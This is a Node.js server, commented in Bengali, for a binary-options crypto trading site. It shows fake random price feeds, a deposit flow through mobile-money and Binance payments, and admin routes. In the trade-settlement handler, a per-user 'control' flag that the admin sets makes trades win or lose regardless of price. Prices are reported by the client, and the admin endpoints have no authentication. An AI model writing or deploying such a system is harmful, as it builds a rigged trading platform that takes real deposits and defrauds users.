const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let users = {
  "demo_user": { liveBalance: 10.00, demoBalance: 11061.95, activeAccount: "demo", control: "normal" }
};
let transactions = [];

let ASSETS = {
  'BTC':  { name: 'Bitcoin', ticker: 'BTC', price: 68450.00, decimals: 2, payout: 92, vol: 3.5 },
  'ETH':  { name: 'Ethereum', ticker: 'ETH', price: 3420.00, decimals: 2, payout: 90, vol: 0.8 },
  'SOL':  { name: 'Solana', ticker: 'SOL', price: 175.50, decimals: 2, payout: 88, vol: 0.15 },
  'BNB':  { name: 'BNB', ticker: 'BNB', price: 590.20, decimals: 2, payout: 88, vol: 0.25 },
  'XRP':  { name: 'XRP', ticker: 'XRP', price: 0.6250, decimals: 4, payout: 85, vol: 0.0006 },
  'DOGE': { name: 'Dogecoin', ticker: 'DOGE', price: 0.1425, decimals: 4, payout: 82, vol: 0.0003 },
  'TON':  { name: 'Toncoin', ticker: 'TON', price: 5.850, decimals: 3, payout: 86, vol: 0.006 },
  'ADA':  { name: 'Cardano', ticker: 'ADA', price: 0.4850, decimals: 4, payout: 84, vol: 0.0005 }
};

let candleHistories = {};
let currentCandles = {};
let currentCandleMinute = Math.floor(Date.now() / 60000) * 60;

for (let key in ASSETS) {
  let meta = ASSETS[key];
  candleHistories[key] = [];
  let p = meta.price;
  for (let i = 120; i > 0; i--) {
    let t = currentCandleMinute - (i * 60);
    let o = p;
    let delta = (Math.random() - 0.49) * meta.vol * 2.5;
    let c = parseFloat((o + delta).toFixed(meta.decimals));
    let h = parseFloat((Math.max(o, c) + Math.random() * meta.vol * 1.2).toFixed(meta.decimals));
    let l = parseFloat((Math.min(o, c) - Math.random() * meta.vol * 1.2).toFixed(meta.decimals));
    candleHistories[key].push({ time: t, open: o, high: h, low: l, close: c });
    p = c;
  }
  meta.price = p;
  currentCandles[key] = { time: currentCandleMinute, open: p, high: p, low: p, close: p };
}

// ৬০ সেকেন্ডে নতুন ক্যান্ডেল শুরু ও হিস্ট্রিতে পুশ
setInterval(() => {
  let now = Date.now();
  let sec = Math.floor(now / 1000);
  let nowMinute = Math.floor(sec / 60) * 60;
  let remainingSec = 60 - (sec % 60);

  let isNewMinute = (nowMinute > currentCandleMinute);

  for (let key in ASSETS) {
    let meta = ASSETS[key];
    let delta = (Math.random() - 0.495) * meta.vol;
    meta.price = parseFloat((meta.price + delta).toFixed(meta.decimals));

    if (isNewMinute) {
      candleHistories[key].push({ ...currentCandles[key] });
      if (candleHistories[key].length > 300) candleHistories[key].shift();
      currentCandles[key] = {
        time: nowMinute,
        open: meta.price,
        high: meta.price,
        low: meta.price,
        close: meta.price
      };
    } else {
      if (meta.price > currentCandles[key].high) currentCandles[key].high = meta.price;
      if (meta.price < currentCandles[key].low) currentCandles[key].low = meta.price;
      currentCandles[key].close = meta.price;
    }
  }

  if (isNewMinute) currentCandleMinute = nowMinute;

  let tickPayload = {
    type: 'TICK',
    countdown: remainingSec,
    serverTime: now,
    assets: {}
  };

  for (let key in ASSETS) {
    tickPayload.assets[key] = {
      price: ASSETS[key].price.toFixed(ASSETS[key].decimals),
      candle: currentCandles[key],
      history: candleHistories[key],
      payout: ASSETS[key].payout
    };
  }

  let broadcastData = JSON.stringify(tickPayload);
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(broadcastData);
  });
}, 1000);

app.get('/api/history/:asset', (req, res) => {
  let asset = req.params.asset || 'BTC';
  if (candleHistories[asset]) {
    res.json({
      success: true,
      history: candleHistories[asset],
      candle: currentCandles[asset],
      meta: ASSETS[asset]
    });
  } else {
    res.json({ success: false });
  }
});

// ট্রেড প্লেস
app.post('/api/trade', (req, res) => {
  const { username, amount, direction, accountType, durationSec, asset } = req.body;
  let user = users[username] || users["demo_user"];
  let targetBal = accountType === 'live' ? user.liveBalance : user.demoBalance;

  if (targetBal < amount) {
    return res.json({ success: false, message: "অপর্যাপ্ত ব্যালেন্স!" });
  }

  if (accountType === 'live') user.liveBalance -= amount;
  else user.demoBalance -= amount;

  let currentBal = accountType === 'live' ? user.liveBalance : user.demoBalance;
  let selectedAsset = ASSETS[asset] || ASSETS['BTC'];

  res.json({
    success: true,
    entryPrice: selectedAsset.price.toFixed(selectedAsset.decimals),
    balance: currentBal.toFixed(2),
    direction,
    amount,
    durationSec,
    asset
  });
});

// ট্রেড সেটেলমেন্ট
app.post('/api/settle-trade', (req, res) => {
  const { username, entryPrice, exitPrice, direction, amount, accountType, asset } = req.body;
  let user = users[username] || users["demo_user"];
  let selectedAsset = ASSETS[asset] || ASSETS['BTC'];

  let isWin = false;
  if (user.control === 'win') isWin = true;
  else if (user.control === 'loss') isWin = false;
  else {
    if (direction === 'UP') isWin = (Number(exitPrice) > Number(entryPrice));
    else if (direction === 'DOWN') isWin = (Number(exitPrice) < Number(entryPrice));
  }

  let profitRatio = 1 + (selectedAsset.payout / 100);
  let profit = isWin ? parseFloat((amount * profitRatio).toFixed(2)) : 0;

  if (isWin) {
    if (accountType === 'live') user.liveBalance += profit;
    else user.demoBalance += profit;
  }

  let finalBal = accountType === 'live' ? user.liveBalance : user.demoBalance;
  res.json({ success: true, isWin, profit, balance: finalBal.toFixed(2) });
});

// ডিপোজিট সাবমিট (বিকাশ, নগদ, রকেট, বাইনান্স)
app.post('/api/deposit', (req, res) => {
  const { username, method, amount, trxId, senderNumber } = req.body;
  if (!amount || amount <= 0 || !trxId) {
    return res.json({ success: false, message: "সকল তথ্য সঠিকভাবে পূরণ করুন!" });
  }

  let tx = {
    id: Date.now(),
    username: username || "demo_user",
    type: "Deposit",
    method: method,
    amount: Number(amount),
    senderNumber: senderNumber || "N/A",
    trxId: trxId,
    status: "Pending",
    time: new Date().toLocaleString()
  };

  transactions.unshift(tx);
  res.json({ success: true, message: "ডিপোজিট রিকোয়েস্ট সফলভাবে জমা হয়েছে! অ্যাডমিন রিভিউ করার পর ব্যালেন্স যোগ হবে।" });
});

app.post('/api/switch-account', (req, res) => {
  const { username, type } = req.body;
  let user = users[username] || users["demo_user"];
  user.activeAccount = type;
  res.json({ success: true, activeAccount: type, balance: type === 'live' ? user.liveBalance : user.demoBalance });
});

app.get('/api/user/info', (req, res) => {
  let user = users["demo_user"];
  res.json({ liveBalance: user.liveBalance, demoBalance: user.demoBalance });
});

// অ্যাডমিন রাউট
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.get('/api/admin/data', (req, res) => {
  let totalDeposit = transactions.filter(t => t.type === 'Deposit' && t.status === 'Approved').reduce((s, t) => s + Number(t.amount), 0);
  res.json({ users, transactions, assets: ASSETS, totalDeposit });
});

// অ্যাডমিন ট্রানজাকশন অ্যাপ্রুভ বা রিজেক্ট
app.post('/api/admin/tx-action', (req, res) => {
  const { txId, status } = req.body;
  let tx = transactions.find(t => t.id == txId);
  if (tx) {
    tx.status = status;
    if (status === 'Approved' && tx.type === 'Deposit') {
      let u = users[tx.username] || users["demo_user"];
      u.liveBalance += Number(tx.amount);
    }
    res.json({ success: true });
  } else {
    res.json({ success: false, message: "Transaction not found" });
  }
});

app.post('/api/admin/action', (req, res) => {
  const { username, action, value } = req.body;
  if (users[username]) {
    if (action === 'control') users[username].control = value;
    res.json({ success: true });
  } else res.json({ success: false });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
